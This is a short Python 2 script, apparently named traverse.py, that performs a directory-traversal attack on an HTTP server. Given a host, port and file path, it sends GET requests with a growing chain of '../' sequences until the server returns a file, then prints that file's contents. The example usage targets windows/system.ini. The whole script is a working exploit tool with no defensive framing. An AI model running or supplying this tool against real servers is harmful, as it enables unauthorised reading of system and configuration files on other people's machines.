import argparse
import httplib
 
MAX_NESTED_DIRECTORY = 32
 
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d')
    parser.add_argument('-p')
    parser.add_argument('-f') 
    args = parser.parse_args()
    if args.d == None or args.p == None or args.f == None:
        print "[!]EXAMPLE USAGE: traverse.py -d 127.0.0.1 -p 80 -f windows/system.ini"
        return
    httpConn = httplib.HTTPConnection(args.d, int(args.p))
    for i in xrange(0, MAX_NESTED_DIRECTORY):
        temp = MakePath(args.f, i)
        httpConn.request('GET', temp)
        resp = httpConn.getresponse()
        content =  resp.read()
        if resp.status == 404:
            print 'Not found ' + temp
        else:
            print 'Found ' + temp
            print'------------------------------------------'
            print content
            print'---------------------------------------EOF'
            break
         
     
     
def MakePath(f, count):
    a = ""
    for i in xrange(0, count):
        a = a + "../"
    return a + f
 
if __name__ == "__main__":
    main()
